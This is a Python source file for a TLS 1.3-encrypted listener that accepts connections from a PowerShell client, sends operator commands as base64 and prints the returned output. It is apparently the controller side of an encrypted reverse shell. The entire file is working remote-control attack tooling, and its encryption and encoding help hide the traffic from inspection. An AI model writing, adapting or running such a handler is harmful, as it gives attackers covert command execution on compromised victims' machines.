import socket
import base64
import sys
import ssl

HOST = '0.0.0.0'
PORT = 5656
CERTFILE = 'server.crt'
KEYFILE = 'server.key'

def read_line(conn):
    """Helper function to read a full line from the socket."""
    data_buffer = b""
    while b"\n" not in data_buffer:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                return None
            data_buffer += chunk
        except ssl.SSLWantReadError:
            # No data available right now, wait and retry
            continue
        except ConnectionResetError:
            return None
    
    line, _, _ = data_buffer.partition(b"\n")
    return line.strip()

def start_listener():
    """Starts the main listener loop."""
    
    # Create SSL context
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.minimum_version = ssl.TLSVersion.TLSv1_3
    try:
        context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)
    except FileNotFoundError:
        print(f"[!] Error: Certificate or key file not found.")
        print(f"    Please generate them first. e.g.:")
        print(f"    openssl req -x509 -newkey rsa:4096 -keyout {KEYFILE} -out {CERTFILE} -days 365 -nodes -subj \"/CN=localhost\"")
        sys.exit(1)

    # Create the server socket
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[*] Secure listener started on {HOST}:{PORT}...")
    except Exception as e:
        print(f"[!] Error setting up listener: {e}")
        sys.exit(1)

    while True:
        try:
            # Wait for a connection
            conn, addr = server_socket.accept()
            
            # Wrap the connection in SSL
            secure_conn = context.wrap_socket(conn, server_side=True)
            
            with secure_conn:
                print(f"\n[+] Secure connection received from: {addr[0]}:{addr[1]}")

                # 1. Read the initial "> " prompt from the PowerShell client
                initial_prompt = secure_conn.recv(1024).decode('utf-8').strip()
                if not initial_prompt:
                    print("[-] Client connected but sent no data. Closing.")
                    continue
                
                print(f"{initial_prompt} ", end="", flush=True)

                # 2. Start the command loop
                while True:
                    command_to_send = input()
                    if not command_to_send:
                        print(f"{initial_prompt} ", end="", flush=True)
                        continue

                    command_bytes = command_to_send.encode('utf-8')
                    command_base64 = base64.b64encode(command_bytes).decode('utf-8')

                    secure_conn.sendall(f"{command_base64}\n".encode('utf-8'))

                    if command_to_send.lower() == 'exit':
                        print("[-] Sent 'exit' command. Closing this connection.")
                        break

                    base64_output = read_line(secure_conn)
                    if base64_output is None:
                        print("\n[-] Client disconnected unexpectedly.")
                        break

                    try:
                        output_bytes = base64.b64decode(base64_output)
                        output = output_bytes.decode('utf-8', errors='ignore')
                        
                        print(output, end="")
                        print(f"{initial_prompt} ", end="", flush=True)

                    except base64.binascii.Error as e:
                        print(f"\n[!] Error decoding Base64: {e}")
                        print(f"{initial_prompt} ", end="", flush=True)
                        
        except ssl.SSLError as e:
            print(f"\n[!] SSL Error: {e}. Probably a client-side issue.")
            print("[-] Waiting for new connection...")
        except ConnectionResetError:
            print("\n[-] Client connection reset. Waiting for new connection...")
        except KeyboardInterrupt:
            print("\n[!] Server shutting down.")
            server_socket.close()
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] An error occurred: {e}")
            print("[-] Waiting for new connection...")

if __name__ == "__main__":
    start_listener()
